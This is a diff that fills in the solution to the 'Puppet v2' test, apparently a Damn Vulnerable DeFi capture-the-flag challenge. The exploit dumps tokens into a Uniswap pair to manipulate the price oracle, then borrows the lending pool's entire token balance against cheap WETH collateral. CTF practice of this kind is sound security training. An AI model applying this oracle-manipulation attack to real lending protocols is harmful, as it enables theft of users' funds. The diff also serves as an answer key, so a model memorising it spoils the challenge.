@@ -82,6 +82,17 @@ describe('[Challenge] Puppet v2', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        await this.token.connect(attacker).approve(this.uniswapRouter.address, ATTACKER_INITIAL_TOKEN_BALANCE)
+
+        await this.uniswapRouter.connect(attacker).swapExactTokensForETH(ATTACKER_INITIAL_TOKEN_BALANCE, 1, [this.token.address, this.weth.address], attacker.address, (await ethers.provider.getBlock('latest')).timestamp * 2)
+
+        const TO_DEPOSIT = (await ethers.provider.getBalance(attacker.address)).sub(ethers.utils.parseEther('0.1'))
+
+        await this.weth.connect(attacker).deposit({value: TO_DEPOSIT})
+
+        await this.weth.connect(attacker).approve(this.lendingPool.address, await this.weth.balanceOf(attacker.address))
+        
+        await this.lendingPool.connect(attacker).borrow(POOL_INITIAL_TOKEN_BALANCE)
     });
 
     after(async function () {
